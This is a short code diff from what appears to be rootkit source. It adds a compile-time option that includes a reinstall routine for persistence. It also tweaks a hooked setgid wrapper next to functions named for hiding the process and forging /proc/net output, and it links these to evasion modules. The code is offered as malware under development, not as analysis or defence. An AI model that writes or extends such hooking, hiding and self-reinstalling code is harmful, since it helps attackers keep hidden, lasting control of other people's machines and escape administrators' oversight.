@@ -9,6 +9,14 @@ int block_strings(char *const argv[]);
 #include "evasion/block_strings.c"
 #endif
 
+#ifdef DO_REINSTALL
+void reinstall(void);
+#include "reinstall.c"
+#endif
+
+/* for the time being it's 100% necessary to have DO_REINSTALL
+ * enabled too. this is just this way so that i can fix everything
+ * first. */
 #if defined(DO_EVASIONS) && defined(DO_REINSTALL)
 #include "evasion/evasion.h"
 #endif
@@ -33,7 +41,7 @@ FILE *forge_procnet(const char *pathname);
 
 void _setgid(gid_t gid){
     hook(CSETGID);
-    (void)call(CSETGID, gid);
+    call(CSETGID, gid);
 }
 
 void hide_self(void){
